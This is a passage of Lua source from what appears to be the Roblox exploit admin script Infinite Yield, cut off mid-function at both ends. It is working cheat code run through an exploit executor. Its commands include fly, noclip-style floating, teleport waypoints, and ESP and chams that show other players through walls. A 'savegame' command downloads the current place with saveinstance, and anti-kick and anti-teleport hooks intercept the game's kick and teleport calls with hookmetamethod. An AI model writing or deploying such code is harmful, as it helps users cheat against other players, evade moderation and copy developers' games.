		bv.MaxForce = v3zero
		bv.Velocity = v3zero

		local bg = Instance.new("BodyGyro")
		bg.Name = gyroHandlerName
		bg.Parent = root
		bg.MaxTorque = v3inf
		bg.P = 1000
		bg.D = 50

		mfly1 = speaker.CharacterAdded:Connect(function()
			local bv = Instance.new("BodyVelocity")
			bv.Name = velocityHandlerName
			bv.Parent = root
			bv.MaxForce = v3zero
			bv.Velocity = v3zero

			local bg = Instance.new("BodyGyro")
			bg.Name = gyroHandlerName
			bg.Parent = root
			bg.MaxTorque = v3inf
			bg.P = 1000
			bg.D = 50
		end)

		mfly2 = RunService.RenderStepped:Connect(function()
			root = getRoot(speaker.Character)
			camera = workspace.CurrentCamera
			if speaker.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
				local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
				local VelocityHandler = root:FindFirstChild(velocityHandlerName)
				local GyroHandler = root:FindFirstChild(gyroHandlerName)

				VelocityHandler.MaxForce = v3inf
				GyroHandler.MaxTorque = v3inf
				if not vfly then humanoid.PlatformStand = true end
				GyroHandler.CFrame = camera.CoordinateFrame
				VelocityHandler.Velocity = v3none

				local direction = controlModule:GetMoveVector()
				if direction.X > 0 then
					VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
				end
				if direction.X < 0 then
					VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
				end
				if direction.Z > 0 then
					VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
				end
				if direction.Z < 0 then
					VelocityHandler.Velocity = VelocityHandler.Velocity - camera.CFrame.LookVector * (direction.Z * ((vfly and vehicleflyspeed or iyflyspeed) * 50))
				end
			end
		end)
	end

	addcmd('fly',{},function(args, speaker)
		if not IsOnMobile then
			NOFLY()
			wait()
			sFLY()
		else
			mobilefly(speaker)
		end
		if args[1] and isNumber(args[1]) then
			iyflyspeed = args[1]
		end
	end)

	addcmd('flyspeed',{'flysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			iyflyspeed = speed
		end
	end)

	addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
		if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
	end)

	addcmd('vfly',{'vehiclefly'},function(args, speaker)
		if not IsOnMobile then
			NOFLY()
			wait()
			sFLY(true)
		else
			mobilefly(speaker, true)
		end
		if args[1] and isNumber(args[1]) then
			vehicleflyspeed = args[1]
		end
	end)

	addcmd('togglevfly',{},function(args, speaker)
		if FLYING then
			if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
		else
			if not IsOnMobile then sFLY(true) else mobilefly(speaker, true) end
		end
	end)

	addcmd('vflyspeed',{'vflysp','vehicleflyspeed','vehicleflysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			vehicleflyspeed = speed
		end
	end)

	addcmd('qefly',{'flyqe'},function(args, speaker)
		if args[1] == 'false' then
			QEfly = false
		else
			QEfly = true
		end
	end)

	addcmd('togglefly',{},function(args, speaker)
		if FLYING then
			if not IsOnMobile then NOFLY() else unmobilefly(speaker) end
		else
			if not IsOnMobile then sFLY() else mobilefly(speaker) end
		end
	end)

	CFspeed = 50
	addcmd('cframefly', {'cfly'}, function(args, speaker)
		-- Full credit to peyton#9148 (apeyton)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
		local Head = speaker.Character:WaitForChild("Head")
		Head.Anchored = true
		if CFloop then CFloop:Disconnect() end
		CFloop = RunService.Heartbeat:Connect(function(deltaTime)
			local moveDirection = speaker.Character:FindFirstChildOfClass('Humanoid').MoveDirection * (CFspeed * deltaTime)
			local headCFrame = Head.CFrame
			local cameraCFrame = workspace.CurrentCamera.CFrame
			local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
			cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
			local cameraPosition = cameraCFrame.Position
			local headPosition = headCFrame.Position

			local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
			Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
		end)
	end)

	addcmd('uncframefly',{'uncfly'},function(args, speaker)
		if CFloop then
			CFloop:Disconnect()
			speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			local Head = speaker.Character:WaitForChild("Head")
			Head.Anchored = false
		end
	end)

	addcmd('cframeflyspeed',{'cflyspeed'},function(args, speaker)
		if isNumber(args[1]) then
			CFspeed = args[1]
		end
	end)

	Floating = false
	floatName = randomString()
	addcmd('float', {'platform'},function(args, speaker)
		Floating = true
		local pchar = speaker.Character
		if pchar and not pchar:FindFirstChild(floatName) then
			task.spawn(function()
				local Float = Instance.new('Part')
				Float.Name = floatName
				Float.Parent = pchar
				Float.Transparency = 1
				Float.Size = Vector3.new(2,0.2,1.5)
				Float.Anchored = true
				local FloatValue = -3.1
				Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
				notify('Float','Float Enabled (Q = down & E = up)')
				qUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue + 0.5
					end
				end)
				eUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue - 0.5
					end
				end)
				qDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue - 0.5
					end
				end)
				eDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue + 0.5
					end
				end)
				floatDied = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
					FloatingFunc:Disconnect()
					Float:Destroy()
					qUp:Disconnect()
					eUp:Disconnect()
					qDown:Disconnect()
					eDown:Disconnect()
					floatDied:Disconnect()
				end)
				local function FloatPadLoop()
					if pchar:FindFirstChild(floatName) and getRoot(pchar) then
						Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
					else
						FloatingFunc:Disconnect()
						Float:Destroy()
						qUp:Disconnect()
						eUp:Disconnect()
						qDown:Disconnect()
						eDown:Disconnect()
						floatDied:Disconnect()
					end
				end			
				FloatingFunc = RunService.Heartbeat:Connect(FloatPadLoop)
			end)
		end
	end)

	addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
		Floating = false
		local pchar = speaker.Character
		notify('Float','Float Disabled')
		if pchar:FindFirstChild(floatName) then
			pchar:FindFirstChild(floatName):Destroy()
		end
		if floatDied then
			FloatingFunc:Disconnect()
			qUp:Disconnect()
			eUp:Disconnect()
			qDown:Disconnect()
			eDown:Disconnect()
			floatDied:Disconnect()
		end
	end)

	addcmd('togglefloat',{},function(args, speaker)
		if Floating then
			execCmd('unfloat')
		else
			execCmd('float')
		end
	end)

	swimming = false
	local oldgrav = workspace.Gravity
	local swimbeat = nil
	addcmd('swim',{},function(args, speaker)
		if not swimming and speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
			oldgrav = workspace.Gravity
			workspace.Gravity = 0
			local swimDied = function()
				workspace.Gravity = oldgrav
				swimming = false
			end
			local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			gravReset = Humanoid.Died:Connect(swimDied)
			local enums = Enum.HumanoidStateType:GetEnumItems()
			table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
			for i, v in pairs(enums) do
				Humanoid:SetStateEnabled(v, false)
			end
			Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
			swimbeat = RunService.Heartbeat:Connect(function()
				pcall(function()
					speaker.Character.HumanoidRootPart.Velocity = ((Humanoid.MoveDirection ~= Vector3.new() or UserInputService:IsKeyDown(Enum.KeyCode.Space)) and speaker.Character.HumanoidRootPart.Velocity or Vector3.new())
				end)
			end)
			swimming = true
		end
	end)

	addcmd('unswim',{'noswim'},function(args, speaker)
		if speaker and speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid") then
			workspace.Gravity = oldgrav
			swimming = false
			if gravReset then
				gravReset:Disconnect()
			end
			if swimbeat ~= nil then
				swimbeat:Disconnect()
				swimbeat = nil
			end
			local Humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			local enums = Enum.HumanoidStateType:GetEnumItems()
			table.remove(enums, table.find(enums, Enum.HumanoidStateType.None))
			for i, v in pairs(enums) do
				Humanoid:SetStateEnabled(v, true)
			end
		end
	end)

	addcmd('toggleswim',{},function(args, speaker)
		if swimming then
			execCmd('unswim')
		else
			execCmd('swim')
		end
	end)

	addcmd('setwaypoint',{'swp','setwp','spos','saveposition','savepos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			local torso = getRoot(speaker.Character)
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('waypointpos',{'wpp','setwaypointposition','setpos','setwaypoint','setwaypointpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('waypoints',{'positions'},function(args, speaker)
		if SettingsOpen == false then SettingsOpen = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
			CMDsF.Visible = false
		end
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
		maximizeHolder()
	end)

	waypointParts = {}
	addcmd('showwaypoints',{'showwp','showwps'},function(args, speaker)
		execCmd('hidewaypoints')
		wait()
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			local part = Instance.new("Part")
			part.Size = Vector3.new(5,5,5)
			part.CFrame = CFrame.new(x,y,z)
			part.Parent = workspace
			part.Anchored = true
			part.CanCollide = false
			table.insert(waypointParts,part)
			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = part
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = part.Size
			view.Parent = part
		end
		for i,v in pairs(pWayPoints) do
			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = pWayPoints[i].COORD[1]
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = pWayPoints[i].COORD[1].Size
			view.Parent = pWayPoints[i].COORD[1]
			table.insert(waypointParts,view)
		end
	end)

	addcmd('hidewaypoints',{'hidewp','hidewps'},function(args, speaker)
		for i,v in pairs(waypointParts) do
			v:Destroy()
		end
		waypointParts = {}
	end)

	addcmd('waypoint',{'wp','lpos','loadposition','loadpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					local x = WayPoints[i].COORD[1]
					local y = WayPoints[i].COORD[2]
					local z = WayPoints[i].COORD[3]
					getRoot(speaker.Character).CFrame = CFrame.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					getRoot(speaker.Character).CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	tweenSpeed = 1
	addcmd('tweenspeed',{'tspeed'},function(args, speaker)
		local newSpeed = args[1] or 1
		if tonumber(newSpeed) then
			tweenSpeed = tonumber(newSpeed)
		end
	end)

	addcmd('tweenwaypoint',{'twp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(x,y,z)}):Play()
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(pWayPoints[i].COORD[1].Position)}):Play()
				end
			end
		end
	end)

	addcmd('walktowaypoint',{'wtwp'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if speaker.Character then
			for i,_ in pairs(WayPoints) do
				local x = WayPoints[i].COORD[1]
				local y = WayPoints[i].COORD[2]
				local z = WayPoints[i].COORD[3]
				if tostring(WayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(x,y,z)
				end
			end
			for i,_ in pairs(pWayPoints) do
				if tostring(pWayPoints[i].NAME):lower() == tostring(WPName):lower() then
					if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
						speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
						wait(.1)
					end
					speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(pWayPoints[i].COORD[1].Position)
				end
			end
		end
	end)

	addcmd('deletewaypoint',{'dwp','dpos','deleteposition','deletepos'},function(args, speaker)
		for i,v in pairs(WayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(WayPoints, i)
			end
		end
		if AllWaypoints ~= nil and #AllWaypoints > 0 then
			for i,v in pairs(AllWaypoints) do
				if v.NAME:lower() == tostring(getstring(1)):lower() then
					if not v.GAME or v.GAME == PlaceId then
						table.remove(AllWaypoints, i)
					end
				end
			end
		end
		for i,v in pairs(pWayPoints) do
			if v.NAME:lower() == tostring(getstring(1)):lower() then
				notify('Modified Waypoints',"Deleted waypoint: " .. v.NAME)
				table.remove(pWayPoints, i)
			end
		end
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('clearwaypoints',{'cwp','clearpositions','cpos','clearpos'},function(args, speaker)
		WayPoints = {}
		pWayPoints = {}
		refreshwaypoints()
		updatesaves()
		AllWaypoints = {}
		notify('Modified Waypoints','Removed all waypoints')
	end)

	addcmd('cleargamewaypoints',{'cgamewp'},function(args, speaker)
		for i,v in pairs(WayPoints) do
			if v.GAME == PlaceId then
				table.remove(WayPoints, i)
			end
		end
		if AllWaypoints ~= nil and #AllWaypoints > 0 then
			for i,v in pairs(AllWaypoints) do
				if v.GAME == PlaceId then
					table.remove(AllWaypoints, i)
				end
			end
		end
		for i,v in pairs(pWayPoints) do
			if v.GAME == PlaceId then
				table.remove(pWayPoints, i)
			end
		end
		refreshwaypoints()
		updatesaves()
		notify('Modified Waypoints','Deleted game waypoints')
	end)


	local coreGuiTypeNames = {
		-- predefined aliases
		["inventory"] = Enum.CoreGuiType.Backpack,
		["leaderboard"] = Enum.CoreGuiType.PlayerList,
		["emotes"] = Enum.CoreGuiType.EmotesMenu
	}

	-- Load the full list of enums
	for _, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		coreGuiTypeNames[enumItem.Name:lower()] = enumItem
	end

	addcmd('enable',{},function(args, speaker)
		local input = args[1] and args[1]:lower()
		if input then
			if input == "reset" then
				StarterGui:SetCore("ResetButtonCallback", true)
			else
				local coreGuiType = coreGuiTypeNames[input]
				if coreGuiType then
					StarterGui:SetCoreGuiEnabled(coreGuiType, true)
				end
			end
		end
	end)

	addcmd('disable',{},function(args, speaker)
		local input = args[1] and args[1]:lower()
		if input then
			if input == "reset" then
				StarterGui:SetCore("ResetButtonCallback", false)
			else
				local coreGuiType = coreGuiTypeNames[input]
				if coreGuiType then
					StarterGui:SetCoreGuiEnabled(coreGuiType, false)
				end
			end
		end
	end)


	local invisGUIS = {}
	addcmd('showguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
				v.Visible = true
				if not FindInTable(invisGUIS,v) then
					table.insert(invisGUIS,v)
				end
			end
		end
	end)

	addcmd('unshowguis',{},function(args, speaker)
		for i,v in pairs(invisGUIS) do
			v.Visible = false
		end
		invisGUIS = {}
	end)

	local hiddenGUIS = {}
	addcmd('hideguis',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
			if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and v.Visible then
				v.Visible = false
				if not FindInTable(hiddenGUIS,v) then
					table.insert(hiddenGUIS,v)
				end
			end
		end
	end)

	addcmd('unhideguis',{},function(args, speaker)
		for i,v in pairs(hiddenGUIS) do
			v.Visible = true
		end
		hiddenGUIS = {}
	end)

	function deleteGuisAtPos()
		pcall(function()
			local guisAtPosition = Players.LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)
			for _, gui in pairs(guisAtPosition) do
				if gui.Visible == true then
					gui:Destroy()
				end
			end
		end)
	end

	local deleteGuiInput
	addcmd('guidelete',{},function(args, speaker)
		deleteGuiInput = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if input.KeyCode == Enum.KeyCode.Backspace then
					deleteGuisAtPos()
				end
			end
		end)
		notify('GUI Delete Enabled','Hover over a GUI and press backspace to delete it')
	end)

	addcmd('unguidelete',{'noguidelete'},function(args, speaker)
		if deleteGuiInput then deleteGuiInput:Disconnect() end
		notify('GUI Delete Disabled','GUI backspace delete has been disabled')
	end)

	local wasStayOpen = StayOpen
	addcmd('hideiy',{},function(args, speaker)
		isHidden = true
		wasStayOpen = StayOpen
		if StayOpen == true then
			StayOpen = false
			On.BackgroundTransparency = 1
		end
		minimizeNum = 0
		minimizeHolder()
		if not (args[1] and tostring(args[1]) == 'nonotify') then notify('IY Hidden','You can press the prefix key to access the command bar') end
	end)

	addcmd('showiy',{'unhideiy'},function(args, speaker)
		isHidden = false
		minimizeNum = -20
		if wasStayOpen then
			maximizeHolder()
			StayOpen = true
			On.BackgroundTransparency = 0
		else
			minimizeHolder()
		end
	end)

	addcmd('rec', {'record'}, function(args, speaker)
		return COREGUI:ToggleRecording()
	end)

	addcmd('screenshot', {'scrnshot'}, function(args, speaker)
		return COREGUI:TakeScreenshot()
	end)

	addcmd('togglefs', {'togglefullscreen'}, function(args, speaker)
		return GuiService:ToggleFullscreen()
	end)

	addcmd('inspect', {'examine'}, function(args, speaker)
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			GuiService:CloseInspectMenu()
			GuiService:InspectPlayerFromUserId(Players[v].UserId)
		end
	end)

	addcmd('savegame',{'saveplace'},function(args, speaker)
		if saveinstance then
			notify("Loading","Downloading game. This will take a while")
			if getsynasset then
				saveinstance()
			else
				saveinstance(game)
			end
			notify('Game Saved','Saved place to the workspace folder within your exploit folder.')
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing saveinstance)')
		end
	end)


	addcmd('clearerror',{'clearerrors'},function(args, speaker)
		GuiService:ClearError()
	end)

	addcmd('clientantikick',{'antikick'},function(args, speaker)
		if not hookmetamethod then 
			return notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
		end
		local LocalPlayer = Players.LocalPlayer
		local oldhmmi
		local oldhmmnc
		oldhmmi = hookmetamethod(game, "__index", function(self, method)
			if self == LocalPlayer and method:lower() == "kick" then
				return error("Expected ':' not '.' calling member function Kick", 2)
			end
			return oldhmmi(self, method)
		end)
		oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
			if self == LocalPlayer and getnamecallmethod():lower() == "kick" then
				return
			end
			return oldhmmnc(self, ...)
		end)

		notify('Client Antikick','Client anti kick is now active (only effective on localscript kick)')
	end)

	allow_rj = true
	addcmd('clientantiteleport',{'antiteleport'},function(args, speaker)
		if not hookmetamethod then 
			return notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
		end
		local TeleportService = TeleportService
		local oldhmmi
		local oldhmmnc
		oldhmmi = hookmetamethod(game, "__index", function(self, method)
			if self == TeleportService then
				if method:lower() == "teleport" then
					return error("Expected ':' not '.' calling member function Kick", 2)
				elseif method == "TeleportToPlaceInstance" then
					return error("Expected ':' not '.' calling member function TeleportToPlaceInstance", 2)
				end
			end
			return oldhmmi(self, method)
		end)
		oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
			if self == TeleportService and getnamecallmethod():lower() == "teleport" or getnamecallmethod() == "TeleportToPlaceInstance" then
				return
			end
			return oldhmmnc(self, ...)
		end)

		notify('Client AntiTP','Client anti teleport is now active (only effective on localscript teleport)')
	end)

	addcmd('allowrejoin',{'allowrj'},function(args, speaker)
		if args[1] and args[1] == 'false' then
			allow_rj = false
			notify('Client AntiTP','Allow rejoin set to false')
		else
			allow_rj = true
			notify('Client AntiTP','Allow rejoin set to true')
		end
	end)

	addcmd('cancelteleport',{'canceltp'},function(args, speaker)
		TeleportService:TeleportCancel()
	end)

	addcmd('volume',{'vol'},function(args, speaker)
		local level = args[1]/10
		UserSettings():GetService("UserGameSettings").MasterVolume = level
	end)

	addcmd('antilag',{'boostfps','lowgraphics'},function(args, speaker)
		local Terrain = workspace:FindFirstChildOfClass('Terrain')
		Terrain.WaterWaveSize = 0
		Terrain.WaterWaveSpeed = 0
		Terrain.WaterReflectance = 0
		Terrain.WaterTransparency = 0
		Lighting.GlobalShadows = false
		Lighting.FogEnd = 9e9
		settings().Rendering.QualityLevel = 1
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
			elseif v:IsA("Decal") then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(0)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 1
				v.BlastRadius = 1
			end
		end
		for i,v in pairs(Lighting:GetDescendants()) do
			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
				v.Enabled = false
			end
		end
		workspace.DescendantAdded:Connect(function(child)
			task.spawn(function()
				if child:IsA('ForceField') then
					RunService.Heartbeat:Wait()
					child:Destroy()
				elseif child:IsA('Sparkles') then
					RunService.Heartbeat:Wait()
					child:Destroy()
				elseif child:IsA('Smoke') or child:IsA('Fire') then
					RunService.Heartbeat:Wait()
					child:Destroy()
				end
			end)
		end)
	end)

	addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
		if setfpscap and type(setfpscap) == "function" then
			local num = args[1] or 1e6
			if num == 'none' then
				return setfpscap(1e6)
			elseif num > 0 then
				return setfpscap(num)
			else
				return notify('Invalid argument', "Please provide a number above 0 or 'none'.")
			end
		else
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing setfpscap)')
		end
	end)

	addcmd('notify',{},function(args, speaker)
		notify(getstring(1))
	end)

	addcmd('lastcommand',{'lastcmd'},function(args, speaker)
		if cmdHistory[1]:sub(1,11) ~= 'lastcommand' and cmdHistory[1]:sub(1,7) ~= 'lastcmd' then
			execCmd(cmdHistory[1])
		end
	end)

	addcmd('esp',{},function(args, speaker)
		if not CHMSenabled then
			ESPenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					ESP(v)
				end
			end
		else
			notify('ESP','Disable chams (nochams) before using esp')
		end
	end)

	addcmd('noesp',{'unesp'},function(args, speaker)
		ESPenabled = false
		for i,c in pairs(COREGUI:GetChildren()) do
			if string.sub(c.Name, -4) == '_ESP' then
				c:Destroy()
			end
		end
	end)

	addcmd('esptransparency',{},function(args, speaker)
		espTransparency = (args[1] and isNumber(args[1]) and args[1]) or 0.3
		updatesaves()
	end)

	local espParts = {}
	local partEspTrigger = nil
	function partAdded(part)
		if #espParts > 0 then
			if FindInTable(espParts,part.Name:lower()) then
				local a = Instance.new("BoxHandleAdornment")
				a.Name = part.Name:lower().."_PESP"
				a.Parent = part
				a.Adornee = part
				a.AlwaysOnTop = true
				a.ZIndex = 0
				a.Size = part.Size
				a.Transparency = espTransparency
				a.Color = BrickColor.new("Lime green")
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
		end
	end

	addcmd('partesp',{},function(args, speaker)
		local partEspName = getstring(1):lower()
		if not FindInTable(espParts,partEspName) then
			table.insert(espParts,partEspName)
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and v.Name:lower() == partEspName then
					local a = Instance.new("BoxHandleAdornment")
					a.Name = partEspName.."_PESP"
					a.Parent = v
					a.Adornee = v
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = v.Size
					a.Transparency = espTransparency
					a.Color = BrickColor.new("Lime green")
				end
			end
		end
		if partEspTrigger == nil then
			partEspTrigger = workspace.DescendantAdded:Connect(partAdded)
		end
	end)

	addcmd('unpartesp',{'nopartesp'},function(args, speaker)
		if args[1] then
			local partEspName = getstring(1):lower()
			if FindInTable(espParts,partEspName) then
				table.remove(espParts, GetInTable(espParts, partEspName))
			end
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name == partEspName..'_PESP' then
					v:Destroy()
				end
			end
		else
			partEspTrigger:Disconnect()
			partEspTrigger = nil
			espParts = {}
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BoxHandleAdornment") and v.Name:sub(-5) == '_PESP' then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('chams',{},function(args, speaker)
		if not ESPenabled then
			CHMSenabled = true
			for i,v in pairs(Players:GetChildren()) do
				if v.ClassName == "Player" and v.Name ~= speaker.Name then
					CHMS(v)
				end
			end
		else
			notify('Chams','Disable ESP (noesp) before using chams')
		end
	end)

	addcmd('nochams',{'unchams'},function(args, speaker)
		CHMSenabled = false
		for i,v in pairs(Players:GetChildren()) do
			local chmsplr = v
			for i,c in pairs(COREGUI:GetChildren()) do
				if c.Name == chmsplr.Name..'_CHMS' then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('locate',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			Locate(Players[v])
		end
	end)

	addcmd('nolocate',{'unlocate'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if args[1] then
			for i,v in pairs(players) do
				for i,c in pairs(COREGUI:GetChildren()) do
					if c.Name == Players[v].Name..'_LC' then
						c:Destroy()
					end
				end
			end
		else
			for i,c in pairs(COREGUI:GetChildren()) do
				if string.sub(c.Name, -3) == '_LC' then
					c:Destroy()
				end
			end
		end
	end)

	viewing = nil
	addcmd('view',{'spectate'},function(args, speaker)
		StopFreecam()
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			viewing = Players[v]
			workspace.CurrentCamera.CameraSubject = viewing.Character
			notify('Spectate','Viewing ' .. Players[v].Name)
			local function viewDiedFunc()
				repeat wait() until Players[v].Character ~= nil and getRoot(Players[v].Character)
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewDied = Players[v].CharacterAdded:Connect(viewDiedFunc)
			local function viewChangedFunc()
				workspace.CurrentCamera.CameraSubject = viewing.Character
			end
			viewChanged = workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(viewChangedFunc)
		end
	end)

	addcmd('viewpart',{'viewp'},function(args, speaker)
		StopFreecam()
		if args[1] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
					wait(0.1)
					workspace.CurrentCamera.CameraSubject = v
				end
			end
		end
	end)

	addcmd('unview',{'unspectate'},function(args, speaker)
		StopFreecam()
		if viewing ~= nil then
			viewing = nil
			notify('Spectate','View turned off')
		end
